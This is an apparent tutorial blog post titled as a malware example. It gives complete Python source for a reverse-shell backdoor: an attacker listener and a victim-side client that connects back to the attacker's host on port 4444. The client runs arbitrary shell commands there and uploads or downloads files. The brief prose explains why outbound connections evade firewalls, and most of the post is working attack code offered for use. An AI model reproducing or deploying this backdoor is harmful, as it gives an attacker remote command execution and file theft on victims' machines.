---
title: "Malware example: backdoor"
date: 2019-03-03

client: ["malware",]
menu: "main"
---

In this example we are using a server listener on the attacker machine and a reverse backdoor on the client that connects to the server.
This is more convenient then a connection that goes from attacker directly to the victim since firewalls might block it.  

When the connection is initiated from the victim to the attacker we can use a port like 8080 that is probably already open on the victims outbound firewall. We will use sockets and send the data over a TCP stream.

---

Message Oriented protocols send data in distinct chunks or groups. The receiver of data can determine where one message ends and another begins. Stream protocols send a continuous flow of data.

Here is an example with mobile phones. Text messages would be a message oriented protocol as each text message is distinct from the other messages. A phone call is stream oriented as there is a continuous flow of audio throughout the call.

UDP is message oriented and TCP is stream oriented.

---

In this example we will use serialization which has these benefits:

  * the message is well defined, the receiver knows if message is incomplete
  * it can be used to transfer objects (lists, dicts, etc)

At the client we will convert our object to a stream of well defined bytes, on the server we will convert the well-defined stream of bytes back into an object.  

We will use JSON to implement this. This way we can convert data structures (such as objects, dictionaries, lists etc) into text (json.dumps(data))

The text will then be send over the TCP stream and the receiver will use JSON again to convert it back into its original data structure (json.loads(data))

```python
#!/usr/bin/env python
import socket
import json
import base64
import sys

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("\n [+] Waiting for connection \n")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        # get the received data from our backdoor command
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
                result = self.execute_remotely(command)
            except Exception:
                result = "[-] Error during command execution."

            print(result)

my_listener = Listener("192.168.0.10", 4444)
my_listener.run()
```

```python
#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)


my_door = Backdoor("192.168.0.10", 4444)
my_door.run()
```
